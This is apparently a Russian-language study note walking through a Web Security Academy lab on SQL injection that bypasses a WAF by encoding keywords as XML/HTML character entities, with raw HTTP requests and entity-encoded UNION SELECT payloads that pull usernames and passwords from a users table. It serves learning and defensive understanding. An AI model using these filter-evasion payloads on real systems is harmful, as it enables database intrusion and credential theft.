[[0Определение SQL Injection]] - карта раздела
## Оглавление


---


> [!info] Основное
> По факту мы можем выполнять атаку используя любые контролируемые входные данные, которые обрабатываются как SQL-запрос, например некоторые веб-сайты принимают входные данные в формате JSON или XML и используют их для запроса к БД
> Эти разные форматы могут по разному отражать атаки которые в противном случае были бы заблокированы из-за WAFS и других механизмов защиты
> Слабые реализации часто ищут запросе распространенные ключевые слова для SQL-инъекции, поэтому мы можем обойти эти фильтры закодировав или экранирую символы в запрещенных ключевых словах.

Пример SQL инъекции которая на основе XML использует управляющую последовательность XML для кодирования символа S в `SELECT`
```
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
Это будет расшифровано на стороне сервера перед передачей в интерпретатор SQL 
Пример решения лабы:
мы знаем что фильтрация уязвима к sql запросу, при этом запрос отправляется в 
XML форме, соответственно мы можем попробовать потестировать разные его параметры 
```
POST /product/stock HTTP/1.1
Host: 0a9700bd0437892e8261f16f001c00a7.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
Content-Type: application/xml
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a9700bd0437892e8261f16f001c00a7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a9700bd0437892e8261f16f001c00a7.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=onFmuhPSNCGCkLjks5E4XCjfiqbhv6ht

<?xml version="1.0" encoding="UTF-8"?><stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```
первый параметр не проходит во втором получаем что наша инъекция была остановлена, потому что пришел ответ, `attack detected`, следовательно можно попробовать ее закодировать, в base64 у меня не получилось а вот в HTML вполне, вы итоге получаем
```
UNION SELECT username FROM users
================================
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;
================================
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 37

administrator
179 units
carlos
wiener
```
сразу вывести два столбца таким методом у меня не получилось поэтому я забирал сначала
имена из базы а потом пароли
```
UNION SELECT password FROM users
=================================
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;
=================================
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 72

eovj8zjnsu1iqzfdv5fg
179 units
hh72dlc1ivtvjm7q7cp0
b3y6lpg8lfbpbgpxlh2d
```